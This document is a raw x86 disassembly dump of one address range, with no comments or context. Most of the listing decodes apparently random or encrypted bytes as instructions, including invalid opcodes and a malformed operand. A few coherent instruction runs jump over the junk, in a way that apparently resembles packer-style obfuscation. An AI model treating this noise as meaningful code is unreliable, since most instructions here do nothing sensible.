  41bdc0:	xchg   BYTE PTR [ecx],bh
  41bdc2:	jmp    0x41bde5
  41bdc4:	mov    al,ds:0x1c9f80ae
  41bdc9:	mov    eax,0xd4f02ed9
  41bdce:	jnp    0x41bdd2
  41bdd0:	push   ecx
  41bdd1:	ins    DWORD PTR es:[edi],dx
  41bdd2:	mov    ch,0x97
  41bdd4:	pop    esp
  41bdd5:	lock adc DWORD PTR [edx-0x4a2ad5fb],esi
  41bddc:	sub    cl,BYTE PTR gs:[ecx+0x1b]
  41bde0:	jno    0x41bd8b
  41bde2:	push   eax
  41bde3:	xlat   BYTE PTR ds:[ebx]
  41bde4:	jge    0x41bdb5
  41bde6:	push   0xffffff94
  41bde8:	mul    BYTE PTR ds:0xf43c8069
  41bdee:	out    0xce,eax
  41bdf0:	jns    0x41bd8e
  41bdf2:	adc    eax,0x83656c9d
  41bdf7:	push   cs
  41bdf8:	fidiv  WORD PTR [edx-0x14afe431]
  41bdfe:	addr16 adc ebp,ebp
  41be01:	xlat   BYTE PTR ds:[ebx]
  41be02:	pop    ds
  41be03:	adc    BYTE PTR [ecx+0x358062d9],0x0
  41be0a:	mov    edx,edi
  41be0c:	lods   al,BYTE PTR ds:[esi]
  41be0d:	dec    edi
  41be0e:	jbe    0x41be0a
  41be10:	jo     0x41bdbe
  41be12:	retf   
  41be13:	add    al,0xed
  41be15:	mov    es,WORD PTR [eax+0x1d]
  41be18:	int3   
  41be19:	or     ebx,edx
  41be1b:	lock add esi,ebp
  41be1e:	jle    0x41be02
  41be20:	in     al,dx
  41be21:	mov    ebx,0xf1611f71
  41be26:	mov    DWORD PTR [si-0x5010],esp
  41be2b:	retf   
  41be2c:	in     eax,dx
  41be2d:	mov    bh,BYTE PTR [edx+ebp*2]
  41be30:	inc    ecx
  41be31:	xchg   ebp,eax
  41be32:	dec    esp
  41be33:	int    0xc
  41be35:	sbb    eax,0x981ef234
  41be3a:	add    al,0x1b
  41be3c:	jp     0x41bdd6
  41be3e:	inc    ecx
  41be3f:	xor    bl,BYTE PTR [edi+0x21]
  41be42:	idiv   BYTE PTR [ebp+0x19]
  41be45:	es ins DWORD PTR es:[edi],dx
  41be47:	jne    0x41bebf
  41be49:	or     DWORD PTR [ebp-0x22],esp
  41be4c:	ror    DWORD PTR [esi-0x11199d18],0xe7
  41be53:	or     bl,BYTE PTR [ebp-0x45e172f9]
  41be59:	adc    eax,0xc97a119d
  41be5e:	inc    ebx
  41be60:	mov    bl,0x76
  41be62:	sbb    eax,0x7c811788
  41be67:	bound  eax,QWORD PTR [ebp-0x647d370c]
  41be6d:	xchg   DWORD PTR [ecx+0x7],ebx
  41be70:	xchg   edx,eax
  41be71:	sub    bl,al
  41be73:	jg     0x41bea5
  41be75:	pop    esi
  41be76:	js     0x41bed6
  41be78:	cmp    DWORD PTR [edx+0x4b3fa89b],ecx
  41be7e:	fisub  WORD PTR [eax+eax*1]
  41be81:	not    BYTE PTR [ebx-0x474b8751]
  41be87:	adc    al,0x6e
  41be89:	mov    ds,WORD PTR [edi+eiz*1-0x383d0508]
  41be90:	mul    DWORD PTR [esi-0x7ba5bfb2]
  41be96:	cli    
  41be97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be98:	xlat   BYTE PTR ds:[ebx]
  41be99:	mov    BYTE PTR [esi-0x3a],dh
  41be9c:	dec    eax
  41be9d:	dec    esi
  41be9e:	mov    ds:0x8a7e6144,al
  41bea3:	rcl    dh,0xfd
  41bea6:	adc    edi,eax
  41bea8:	adc    eax,0x76ecb3eb
  41bead:	ins    DWORD PTR es:[edi],dx
  41beae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41beaf:	and    DWORD PTR [ebp-0x61],esp
  41beb2:	push   cs
  41beb3:	pop    esp
  41beb4:	bnd jb 0x41beda
  41beb7:	(bad)  
  41beb8:	repz addr16 sbb eax,0x61e056e7
  41bebf:	mov    BYTE PTR [edx],0x8c
  41bec2:	xchg   edx,ecx
  41bec4:	and    dl,al
  41bec6:	inc    ebx
  41bec7:	push   ds
  41bec8:	sahf   
  41bec9:	push   ds
  41beca:	mov    eax,ds:0xf5f41ba9
  41becf:	aad    0x3d
  41bed1:	jb     0x41be6c
  41bed3:	cmp    eax,0x39a0b551
  41bed8:	sti    
  41bed9:	call   0xe590:0x93d30b6
  41bee0:	icebp  
  41bee1:	fs push ss
  41bee3:	pop    edx
  41bee4:	cwde   
  41bee5:	out    dx,al
  41bee6:	popf   
  41bee7:	pushf  
  41bee8:	and    eax,0x893b0449
  41beed:	pop    esi
  41beee:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bef0:	iret   
  41bef1:	push   ds
  41bef2:	xor    BYTE PTR [edx],bh
  41bef4:	pusha  
  41bef5:	imul   esi,eax,0xa1cf2440
  41befb:	jp     0x41bf7b
  41befd:	outs   dx,DWORD PTR ds:[esi]
  41befe:	aam    0x4d
  41bf00:	xchg   DWORD PTR [eax+0x5af18ac],edx
  41bf06:	stos   BYTE PTR es:[edi],al
  41bf07:	int    0xd7
  41bf09:	retf   0xf0c0
  41bf0c:	imul   eax,DWORD PTR [ecx],0x24
  41bf0f:	jl     0x41bf34
  41bf11:	and    al,0xa4
  41bf13:	sbb    BYTE PTR [ebx-0x73d47a2e],0xfb
  41bf1a:	and    eax,0x56ca9d18
  41bf1f:	retf   0xca46
  41bf22:	or     BYTE PTR [ecx-0x1f560878],dh
  41bf28:	mov    dl,cl
  41bf2a:	pusha  
  41bf2b:	xor    ch,BYTE PTR [ebx+0x86d0bf7]
  41bf31:	push   cs
  41bf32:	xchg   esp,eax
  41bf33:	jbe    0x41bec9
  41bf35:	mov    esi,0x27ffe42d
  41bf3a:	pop    edx
  41bf3b:	out    0xdf,al
  41bf3d:	sbb    ah,BYTE PTR [ebx+0x19]
  41bf40:	sub    DWORD PTR [ebx+0x68],edx
  41bf43:	xlat   BYTE PTR ds:[ebx]
  41bf44:	jmp    0x2e1e157c
  41bf49:	sub    ch,BYTE PTR [edi-0x34]
  41bf4c:	call   0x5aebbb3a
  41bf51:	jb     0x41bf40
  41bf53:	sub    ebp,DWORD PTR [ebx+0x50]
  41bf56:	lods   eax,DWORD PTR ds:[esi]
  41bf57:	and    ebx,DWORD PTR [ebx]
  41bf59:	lds    esi,FWORD PTR [ecx]
  41bf5b:	js     0x41bf80
  41bf5d:	rol    BYTE PTR [esi+eax*1-0x4e24b3a2],cl
  41bf64:	jne    0x41beea
  41bf66:	ret    0xf8c6
  41bf69:	jns    0x41bf7a
  41bf6b:	push   ss
  41bf6c:	sbb    DWORD PTR [ebx-0x4706e6dd],edx
  41bf72:	push   0x5f135e4b
  41bf77:	dec    ecx
  41bf78:	pop    ebp
  41bf79:	sbb    eax,0x23aa8ed6
  41bf7e:	jle    0x41bf21
  41bf80:	scas   eax,DWORD PTR es:[edi]
  41bf81:	mov    ah,0x66
  41bf83:	adc    cl,BYTE PTR [edx]
  41bf85:	scas   al,BYTE PTR es:[edi]
  41bf86:	or     al,0x41
  41bf88:	jns    0x41bf56
  41bf8a:	cmp    bl,BYTE PTR [ebx]
  41bf8c:	div    BYTE PTR [eax]
  41bf8e:	inc    eax
  41bf8f:	inc    ebx
  41bf90:	mov    dh,0xb5
  41bf92:	push   ss
  41bf93:	in     al,dx
  41bf94:	mov    ebx,0x5f444c1
  41bf99:	mov    al,0x22
  41bf9b:	clc    
  41bf9c:	(bad)  
  41bf9d:	mov    al,BYTE PTR [eax]
  41bf9f:	mov    esi,0x39abdd42
  41bfa4:	mov    eax,ds:0x6bac9662
  41bfa9:	add    ebx,eax
  41bfab:	xchg   ax,ax
  41bfad:	sahf   
  41bfae:	loope  0x41bfc8
  41bfb0:	cmp    al,0x10
  41bfb2:	or     esi,ecx
  41bfb4:	adc    BYTE PTR [ecx],ah
  41bfb6:	push   cs
  41bfb7:	jno    0x41bf3f
  41bfb9:	or     al,0x63
  41bfbb:	out    dx,eax
  41bfbc:	push   ecx
  41bfbd:	ret    0xfd71
  41bfc0:	lea    ecx,[edx+ecx*1+0x327298]
  41bfc7:	cmp    ecx,eax
  41bfc9:	jne    0x41b45c
  41bfcf:	mov    ebx,esi
  41bfd1:	jmp    0x41bfdb
  41bfd6:	mov    ebx,0x327298
  41bfdb:	mov    eax,DWORD PTR [ebp-0x4]
  41bfde:	jmp    0x41c213
  41bfe3:	mov    edi,0xc5c6c0c6
  41bfe9:	(bad)
  41bfec:	xlat   BYTE PTR ds:[ebx]
  41bfed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfee:	inc    edx
  41bfef:	cmp    al,0xa0
  41bff1:	sbb    ecx,0xffffffb8
  41bff4:	call   0x7e523878
  41bff9:	js     0x41c073
  41bffb:	dec    esi
  41bffc:	cmp    DWORD PTR [ebp+0x23],ebp
  41bfff:	in     eax,dx
  41c000:	shr    BYTE PTR [esi+0x42],1
  41c003:	cmp    bh,BYTE PTR [ebx]
  41c005:	mov    dh,0xb5
  41c007:	(bad)  
  41c008:	jns    0x41bfe3
  41c00a:	or     ah,dl
  41c00c:	cli    
  41c00d:	ins    DWORD PTR es:[edi],dx
  41c00e:	jmp    0x98b2:0x843b583b
  41c015:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c016:	scas   eax,DWORD PTR es:[edi]
  41c017:	repnz clc 
  41c019:	and    bh,cl
  41c01b:	cwde   
  41c01c:	dec    ebx
  41c01d:	fdiv   st(7),st
  41c01f:	push   0xb163c8c3
  41c024:	rcl    DWORD PTR [esi+0x45],1
  41c027:	mov    dh,0xfa
  41c029:	adc    eax,esi
  41c02b:	fdivr  QWORD PTR [esi]
  41c02d:	out    dx,eax
  41c02e:	sub    esi,edi
  41c030:	mov    eax,esp
  41c032:	mov    esi,0xeae85a91
  41c037:	adc    al,BYTE PTR [eax]
  41c039:	in     al,0xde
  41c03b:	jmp    0x2fd61c0d
  41c040:	fucomi st,st(7)
  41c042:	into   
  41c043:	or     ah,BYTE PTR [esi]
  41c045:	mov    bl,0x9a
  41c047:	ja     0x41c05f
  41c049:	push   eax
  41c04a:	adc    bl,cl
  41c04c:	test   DWORD PTR [edx+0x13f34a9d],esp
  41c052:	shl    ebp,1
  41c054:	jmp    0x5555:0x1c0ec6ad
  41c05b:	add    al,0xa2
  41c05d:	call   0xefaa:0xb2b8cd71
  41c064:	retf   0xe1bc
  41c067:	lods   eax,DWORD PTR ds:[esi]
  41c068:	and    dl,bh
  41c06a:	lahf   
  41c06b:	stos   BYTE PTR es:[edi],al
  41c06c:	jmp    0xfebb2bd5
  41c071:	retf   0xece8
  41c074:	jo     0x41c006
  41c076:	mov    DWORD PTR [edx],edx
  41c078:	in     al,0x76
  41c07a:	xchg   esi,eax
  41c07b:	add    BYTE PTR [eax+0x2cfeb9f9],0x3e
  41c082:	push   ds
  41c083:	(bad)  
  41c084:	mov    edx,0xd6b303e8
  41c089:	fs stc 
  41c08b:	popf   
  41c08c:	sub    ah,BYTE PTR [edi+0x711e06da]
  41c092:	jl     0x41c071
  41c094:	jle    0x41c043
  41c096:	test   DWORD PTR [ebp-0x7c],esi
  41c099:	test   eax,0x8522986
  41c09e:	xchg   edi,ebx
  41c0a0:	sub    ah,ah
  41c0a2:	xor    ah,cl
  41c0a4:	mov    al,0x8f
  41c0a6:	mov    eax,0xc8942627
  41c0ab:	mov    al,0xba
  41c0ad:	jge    0x41c078
  41c0af:	loop   0x41c048
  41c0b1:	and    eax,0x6fe4842a
  41c0b6:	outs   dx,BYTE PTR ds:[esi]
  41c0b7:	fst    st(2)
  41c0b9:	push   cs
  41c0ba:	pop    es
  41c0bb:	ja     0x41c121
  41c0bd:	adc    ebp,esi
  41c0bf:	inc    eax
  41c0c0:	add    edi,0x6cdbf8cc
  41c0c6:	dec    DWORD PTR [edx]
  41c0c8:	push   ss
  41c0c9:	push   eax
  41c0ca:	ins    BYTE PTR es:[edi],dx
  41c0cb:	sbb    dh,cl
  41c0cd:	and    edi,eax
  41c0cf:	cmp    ecx,ebp
  41c0d1:	in     eax,0x14
  41c0d3:	and    edi,0xffffff98
  41c0d6:	or     al,BYTE PTR [esi+0x59]
  41c0d9:	and    ebp,DWORD PTR [ebp+0x7b7c86b]
  41c0df:	add    BYTE PTR [edi-0xb8ceaef],dl
  41c0e5:	xchg   ecx,eax
  41c0e6:	adc    BYTE PTR [ebp+0x21],0x94
  41c0ea:	jge    0x41c079
  41c0ec:	xchg   esi,eax
  41c0ed:	or     ch,dl
  41c0ef:	push   ebx
  41c0f0:	lods   al,BYTE PTR ds:[esi]
  41c0f1:	cmp    eax,0x3fda9f71
  41c0f6:	mov    dl,0x85
  41c0f8:	mov    ebx,0x5fd1abe8
  41c0fd:	test   BYTE PTR [ebp-0x327d2334],cl
  41c103:	mov    DWORD PTR [eax],ecx
  41c105:	jl     0x41c155
  41c107:	xchg   esi,eax
  41c108:	in     al,0x98
  41c10a:	(bad)  
  41c10b:	bnd jle 0x41c0be
  41c10e:	pop    ebx
  41c10f:	jo     0x41c16e
  41c111:	les    esi,FWORD PTR [edi]
  41c113:	inc    eax
  41c114:	cs (bad) 
  41c116:	cmp    al,0xd3
  41c118:	repz adc ebp,DWORD PTR [ecx]
  41c11b:	fidiv  DWORD PTR [esi]
  41c11d:	sahf   
  41c11e:	sbb    eax,0x7c4bb6da
  41c123:	inc    edx
  41c124:	cmp    al,0x51
  41c126:	dec    edx
  41c127:	repz jbe 0x41c0aa
  41c12a:	ja     0x41c187
  41c12c:	cmc    
  41c12d:	jnp    0x41c1a2
  41c12f:	cmp    dl,BYTE PTR [eax]
  41c131:	int    0xeb
  41c133:	mov    cl,BYTE PTR [esi-0x706ef587]
  41c139:	pcmpeqb mm5,mm2
  41c13c:	ss stos DWORD PTR es:[edi],eax
  41c13e:	pop    esi
  41c13f:	lds    ebx,FWORD PTR [eax+0x37]
  41c142:	or     bl,BYTE PTR [eax-0x32e533cb]
  41c148:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c149:	or     eax,edx
  41c14b:	pop    ecx
  41c14c:	xchg   ebx,eax
  41c14d:	and    al,0xe3
  41c14f:	mov    esp,0xb67c5bf0
  41c154:	es xchg esp,eax
  41c156:	call   FWORD PTR ds:0xcee1da62
  41c15c:	out    dx,al
  41c15d:	inc    esp
  41c15e:	outs   dx,DWORD PTR ds:[esi]
  41c15f:	popa   
  41c160:	jno    0x41c0fa
  41c162:	xchg   edi,eax
  41c163:	pop    ds
  41c164:	jae    0x41c18b
  41c166:	cmp    BYTE PTR [ecx+0x54ca4f4d],dh
  41c16c:	loop   0x41c173
  41c16e:	ss dec edx
  41c170:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c171:	enter  0x3788,0x10
  41c175:	std    
  41c176:	test   BYTE PTR [esp+edi*2-0x53],ch
  41c17a:	and    dh,BYTE PTR [edx]
  41c17c:	mov    esp,ebx
  41c17e:	repz xor DWORD PTR [esi-0x5500a99a],ebp
  41c185:	push   ecx
  41c186:	xor    edi,DWORD PTR [edx-0x49be7262]
  41c18c:	mov    bl,0xc2
  41c18e:	retf   0x36da
  41c191:	pushf  
  41c192:	cmp    al,0x4
  41c194:	push   edi
  41c195:	sbb    ch,al
  41c197:	or     bl,BYTE PTR [esi+0x31]
  41c19a:	sub    al,0xa9
  41c19c:	jae    0x41c1af
  41c19e:	pushf  
  41c19f:	mov    al,0xbe
  41c1a1:	outs   dx,DWORD PTR ds:[esi]
  41c1a2:	call   0x9e5ba99b
  41c1a7:	and    DWORD PTR [edx+0x58a74e29],ecx
  41c1ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1ae:	dec    edi
  41c1af:	sbb    ecx,DWORD PTR [edx]
  41c1b1:	lds    esp,FWORD PTR [esp+edi*4]
  41c1b4:	retf   
  41c1b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1b6:	int    0x2c
  41c1b8:	daa    
  41c1b9:	push   ds
  41c1ba:	repz popw es
  41c1bd:	jmp    0x7745:0x472fe22a
  41c1c4:	div    DWORD PTR [edi-0x7ca7858]
  41c1ca:	dec    esi
  41c1cb:	xor    ah,bh
  41c1cd:	jns    0x41c219
  41c1cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1d0:	mov    ebx,DWORD PTR [edi]
  41c1d2:	jecxz  0x41c251
  41c1d4:	neg    ebx
  41c1d6:	adc    al,0xdc
  41c1d8:	rol    cl,0x3a
  41c1db:	and    DWORD PTR [ebx+0x31],edi
  41c1de:	xor    DWORD PTR [eax],esi
  41c1e0:	rcr    DWORD PTR ds:0xce03d3c,0x9a
  41c1e7:	and    ah,cl
  41c1e9:	lds    ebx,FWORD PTR [eax+eiz*4]
  41c1ec:	(bad)  
  41c1ed:	lahf   
  41c1ee:	push   ss
  41c1ef:	sub    cl,0x35
  41c1f2:	add    ebp,DWORD PTR [edx+0x50]
  41c1f5:	push   cs
  41c1f6:	sub    DWORD PTR [edi+0x706b2640],ebp
  41c1fc:	daa    
  41c1fd:	pusha  
  41c1fe:	sbb    al,0x44
  41c200:	pop    eax
  41c201:	mov    DWORD PTR [esi],ebp
  41c203:	xchg   esi,eax
  41c204:	xor    esp,esi
  41c206:	jo     0x41c207
  41c208:	push   edx
  41c209:	xchg   ecx,eax
  41c20a:	imul   ecx,DWORD PTR [esi+eiz*4-0x78],0xc7555bf2
  41c212:	inc    ebp
  41c213:	xor    eax,0x7510850
  41c218:	add    eax,ebx
  41c21a:	jmp    0x41c44f
  41c21f:	cmp    al,0xc7
  41c221:	(bad)
  41c224:	rol    esp,0xc5
  41c227:	jb     0x41c1ac
  41c229:	dec    ebx
  41c22a:	pop    ebx
  41c22b:	sets   BYTE PTR [edi+ecx*4+0x787fee50]
  41c233:	adc    BYTE PTR [esi+0x78],bh
  41c236:	js     0x41c254
  41c238:	mov    dh,0x37
  41c23a:	mov    DWORD PTR ds:0x9c121183,esp
  41c240:	(bad)  
  41c241:	lods   al,BYTE PTR ds:[esi]
  41c242:	loopne 0x41c2b5
  41c244:	mov    edx,0x8c2c1df5
  41c249:	int    0xe7
  41c24b:	mov    dh,0xa1
  41c24d:	adc    esi,esp
  41c24f:	inc    edx
  41c250:	jge    0x41c219
  41c252:	call   0x4daa:0x433e2d13
  41c259:	jbe    0x41c1e9
  41c25b:	pop    ebx
  41c25c:	adc    DWORD PTR [edi],ebp
  41c25e:	mov    bh,0x60
  41c260:	cmp    eax,0x1f9cae4d
  41c265:	mov    edx,0x41de305f
  41c26a:	stc    
  41c26b:	add    al,0x13
  41c26d:	inc    esi
  41c26e:	jmp    0x5325ba4f
  41c273:	inc    eax
  41c274:	rol    BYTE PTR [ebx],0xd0
  41c277:	retf   
  41c278:	add    eax,0x7b397f2a
  41c27d:	push   ds
  41c27e:	jae    0x41c234
  41c280:	jnp    0x41c271
  41c282:	mov    ah,0x7c
  41c284:	mov    ebx,0xdb9b53fc
  41c289:	push   ss
  41c28a:	aad    0x43
  41c28c:	aam    0xae
  41c28e:	jl     0x41c24e
  41c290:	dec    edx
  41c291:	inc    eax
  41c292:	or     esi,ecx
  41c294:	call   0x314f20fa
  41c299:	mov    dl,0xf7
  41c29b:	dec    ebp
  41c29c:	dec    ecx
  41c29d:	mov    ebp,0xae7a5f5e
  41c2a2:	ss add eax,0x961f5d32
  41c2a8:	or     BYTE PTR [edi+0x25d4ddfb],ah
  41c2ae:	aas    
  41c2af:	xchg   esi,eax
  41c2b0:	jo     0x41c26a
  41c2b2:	sbb    cl,bh
  41c2b4:	dec    esp
  41c2b5:	cmp    edi,ebx
  41c2b7:	mov    ah,0x1e
  41c2b9:	imul   edx,esp,0x65
  41c2bc:	and    esp,esi
  41c2be:	pop    ecx
  41c2bf:	mov    ah,BYTE PTR [edx-0x19d820c7]
  41c2c5:	sub    ch,BYTE PTR ds:0x97d846b4
  41c2cb:	pop    ebp
  41c2cc:	push   esi
  41c2cd:	ds mov esp,0x980cd30f
  41c2d3:	in     eax,dx
  41c2d4:	or     ch,BYTE PTR [ecx]
  41c2d6:	or     ebp,DWORD PTR [eax]
  41c2d8:	push   0x2119b592
  41c2dd:	xchg   DWORD PTR [esi-0x3c],ebp
  41c2e0:	sahf   
  41c2e1:	dec    ebp
  41c2e2:	push   edi
  41c2e3:	cld    
  41c2e4:	sub    ebx,DWORD PTR [ebx+0x2f]
  41c2e7:	jno    0x41c336
  41c2e9:	push   eax
  41c2ea:	ds cmc 
  41c2ec:	inc    edx
  41c2ed:	hlt    
  41c2ee:	mov    ebx,0x661f3e50
  41c2f3:	lods   al,BYTE PTR ds:[esi]
  41c2f4:	lods   al,BYTE PTR ds:[esi]
  41c2f5:	rol    BYTE PTR [ecx+0x4c6c0e90],0xe3
  41c2fc:	xchg   esi,eax
  41c2fd:	jg     0x41c33a
  41c2ff:	scas   eax,DWORD PTR es:[edi]
  41c300:	and    al,0x71
  41c302:	push   cs
  41c303:	sub    ecx,ecx
  41c305:	inc    eax
  41c306:	mov    bh,0x47
  41c308:	fsub   QWORD PTR [eax-0x77]
  41c30b:	sub    dl,BYTE PTR [edx+0x54003abb]
  41c311:	mov    WORD PTR [edx-0x4],?
  41c314:	push   DWORD PTR [esi+0x53]
  41c317:	fwait
  41c318:	ret    
  41c319:	addr16 or al,0xa6
  41c31c:	fldenv [eax-0x33]
  41c31f:	add    BYTE PTR [esp+edx*8],dh
  41c322:	adc    esi,ebp
  41c324:	push   esp
  41c325:	sub    BYTE PTR [edx+0x66],bh
  41c328:	in     eax,0x1f
  41c32a:	popa   
  41c32b:	mov    ecx,0x4eee7cc4
  41c330:	lods   eax,DWORD PTR ds:[esi]
  41c331:	xchg   DWORD PTR [ecx],esi
  41c333:	pop    esi
  41c334:	inc    edi
  41c335:	sub    al,0xa0
  41c337:	inc    ebp
  41c338:	jne    0x41c2ca
  41c33a:	inc    eax
  41c33b:	int    0xe9
  41c33d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c33e:	fidivr DWORD PTR [eax]
  41c340:	shl    DWORD PTR [esi+edx*4-0x50501cd7],1
  41c347:	sbb    BYTE PTR ds:0xcb04cda2,0xe8
  41c34e:	mov    eax,ds:0xa4d4835
  41c353:	popf   
  41c354:	xor    eax,0x4c99f72
  41c359:	loopne 0x41c392
  41c35b:	les    edi,FWORD PTR [edx]
  41c35d:	cmc    
  41c35e:	stos   BYTE PTR es:[edi],al
  41c35f:	xor    BYTE PTR [edi-0x654e102f],bh
  41c365:	ficomp DWORD PTR [edx]
  41c367:	aad    0x6c
  41c369:	mov    ds:0x2339f93f,al
  41c36e:	scas   al,BYTE PTR es:[edi]
  41c36f:	bound  bx,DWORD PTR [eax]
  41c372:	in     eax,dx
  41c373:	mov    BYTE PTR [edi+0x35],ch
  41c376:	or     DWORD PTR ss:[edi+0x1a8de3fc],ecx
  41c37d:	mov    BYTE PTR [ebp-0x2e],bl
  41c380:	int3   
  41c381:	arpl   bp,bx
  41c383:	or     al,0x65
  41c385:	jnp    0x41c385
  41c387:	ds jge 0x41c357
  41c38a:	sbb    ebx,ecx
  41c38c:	call   0x9832:0x54d4b412
  41c393:	push   eax
  41c394:	mov    DWORD PTR [eax-0x2f],0x662a3dd
  41c39b:	shl    BYTE PTR [eax],cl
  41c39d:	jp     0x41c3b8
  41c39f:	sbb    BYTE PTR [esi-0x35],al
  41c3a2:	and    DWORD PTR [ecx+eiz*4+0x34a809ec],edx
  41c3a9:	jp     0x41c366
  41c3ab:	imul   eax,DWORD PTR [edi-0x69],0x7a
  41c3af:	jne    0x41c36c
  41c3b1:	sub    DWORD PTR [ecx+0x28b558a],ecx
  41c3b7:	(bad)
  41c3bb:	xchg   esp,eax
  41c3bc:	(bad)  
  41c3bd:	cwde   
  41c3be:	mov    bl,0x26
  41c3c0:	cmp    BYTE PTR [ecx-0x2f],ch
  41c3c3:	and    eax,0x83f583c9
  41c3c9:	outs   dx,BYTE PTR ds:[esi]
  41c3ca:	inc    ebp
  41c3cb:	push   0xffffffa9
  41c3cd:	xchg   esp,eax
  41c3ce:	inc    ebx
  41c3cf:	cmp    DWORD PTR [edx],ecx
  41c3d1:	xchg   edx,eax
  41c3d2:	ins    DWORD PTR es:[edi],dx
  41c3d3:	push   0x45
  41c3d5:	fld    st(7)
  41c3d7:	ret    
  41c3d8:	out    dx,eax
  41c3d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3da:	cli    
  41c3db:	mov    esp,0x34a7c605
  41c3e0:	fs pop ebp
  41c3e2:	rcl    BYTE PTR [edx],0x5a
  41c3e5:	addr16 sub al,dh
  41c3e8:	int3   
  41c3e9:	fs cmp al,bh
  41c3ec:	adc    ch,bh
  41c3ee:	push   ebp
  41c3ef:	cli    
  41c3f0:	or     BYTE PTR [ebp-0x4a],ah
  41c3f3:	lea    edx,[ebx-0x6c5008cf]
  41c3f9:	xchg   esp,eax
  41c3fa:	and    DWORD PTR [eax-0x46],0x26
  41c3fe:	cmp    DWORD PTR [edi+0x6c181c05],0xab2c41c8
  41c408:	push   eax
  41c409:	(bad)  
  41c40b:	das    
  41c40c:	jl     0x41c3bc
  41c40e:	fsubr  DWORD PTR ds:0x4664f3b4
  41c414:	sbb    ecx,ecx
  41c416:	dec    ebx
  41c417:	aas    
  41c418:	aam    0x6d
  41c41a:	jp     0x41c42f
  41c41c:	fistp  DWORD PTR [edx+eiz*4]
  41c41f:	cmp    eax,0x4a8f54e9
  41c424:	push   edi
  41c425:	inc    ecx
  41c426:	arpl   WORD PTR [ebx-0x61],ax
  41c429:	mov    ebp,0xb79963cf
  41c42e:	pop    es
  41c42f:	and    al,0xcc
  41c431:	adc    al,BYTE PTR [edi]
  41c433:	fwait
  41c434:	jge    0x41c451
  41c436:	das    
  41c437:	or     esi,ecx
  41c439:	ja     0x41c3c7
  41c43b:	mov    dh,BYTE PTR [edx]
  41c43d:	addr16 and al,0x72
  41c440:	inc    ecx
  41c441:	fs xchg ecx,eax
  41c443:	dec    ecx
  41c444:	add    DWORD PTR [ebx],eax
  41c446:	pushf  
  41c447:	faddp  st(2),st
  41c449:	js     0x41c44f
  41c44b:	dec    ebx
  41c44c:	retf   0x8513
  41c44f:	mov    DWORD PTR [ebp-0xc],eax
  41c452:	jmp    0x41c687
  41c457:	rol    dl,1
  41c459:	(bad)  
  41c45a:	enter  0xd6da,0xd4
  41c45e:	retf   0xb6a7
  41c461:	pop    eax
  41c462:	jp     0x41c448
  41c464:	or     DWORD PTR [eax+0x7fec68e8],0x78
  41c46b:	adc    BYTE PTR [esi+0x78],bh
  41c46e:	js     0x41c49c
  41c470:	(bad)  
  41c471:	jecxz  0x41c493
  41c473:	cmovne ebx,DWORD PTR [ebx]
  41c476:	mov    cl,0x78
  41c478:	push   ebp
  41c479:	add    BYTE PTR [ebp+0x62],0x21
  41c47d:	(bad)  
  41c47e:	dec    BYTE PTR [edx+eax*2]
  41c481:	mov    ebx,0xf747d606
  41c486:	xchg   DWORD PTR ds:0xc49e8b17,edx
  41c48c:	xchg   ebp,eax
  41c48d:	in     al,dx
  41c48e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c48f:	call   0x7eec:0x5b1ea237
  41c496:	pop    ecx
  41c497:	and    eax,0x36a2cfa9
  41c49c:	pop    edi
  41c49d:	fwait
  41c49e:	idiv   DWORD PTR [esi]
  41c4a0:	lods   eax,DWORD PTR ds:[esi]
  41c4a1:	push   0x4b
  41c4a3:	add    eax,0x6a1a59bc
  41c4a8:	pop    ss
  41c4a9:	mov    dh,0x1c
  41c4ab:	mov    esp,0x5e16c044
  41c4b0:	push   esi
  41c4b1:	lahf   
  41c4b2:	sbb    eax,0xbf69257a
  41c4b7:	push   ebx
  41c4b8:	inc    edx
  41c4b9:	scas   al,BYTE PTR es:[edi]
  41c4ba:	(bad)  
  41c4bb:	not    BYTE PTR [ebx+0x53]
  41c4be:	popf   
  41c4bf:	loope  0x41c4be
  41c4c1:	pop    esi
  41c4c2:	xchg   DWORD PTR ds:0x5f5e5e09,ebp
  41c4c8:	add    al,cl
  41c4ca:	mov    al,ds:0xe7934d87
  41c4cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4d0:	pusha  
  41c4d1:	call   0x8a20069b
  41c4d6:	push   esp
  41c4d7:	test   DWORD PTR [eax-0x5c],esi
  41c4da:	dec    ecx
  41c4db:	inc    edx
  41c4dc:	or     BYTE PTR [ecx+edi*8+0x206416bd],bl
  41c4e3:	cmc    
  41c4e4:	aam    0x1c
  41c4e6:	aad    0xa5
  41c4e8:	xchg   al,bl
  41c4ea:	xchg   esp,eax
  41c4eb:	mov    esi,fs
  41c4ed:	imul   esi,DWORD PTR [edi],0xffffff83
  41c4f0:	jbe    0x41c4ac
  41c4f2:	and    DWORD PTR es:[eax-0x69],edi
  41c4f6:	xchg   BYTE PTR [ecx],ch
  41c4f8:	hlt    
  41c4f9:	enter  0x923e,0x4b
  41c4fd:	cwde   
  41c4fe:	add    al,0x4b
  41c500:	jne    0x41c4c1
  41c502:	ret    
  41c503:	dec    ecx
  41c504:	es push eax
  41c506:	mov    ecx,0xb56ab1f9
  41c50b:	cmp    DWORD PTR [ebp-0x65],edi
  41c50e:	push   0xffffffed
  41c510:	loopne 0x41c50f
  41c512:	shl    bl,0xd6
  41c515:	cmp    eax,DWORD PTR [edx]
  41c517:	mov    cl,0x83
  41c519:	ror    DWORD PTR [eax],0x48
  41c51c:	scas   al,BYTE PTR es:[edi]
  41c51d:	push   eax
  41c51e:	xchg   ebp,eax
  41c51f:	ds mov ebx,0x2b3c7651
  41c525:	and    cl,BYTE PTR [ebp+0x4496f779]
  41c52b:	(bad)  
  41c52c:	mov    esi,0x1d616e28
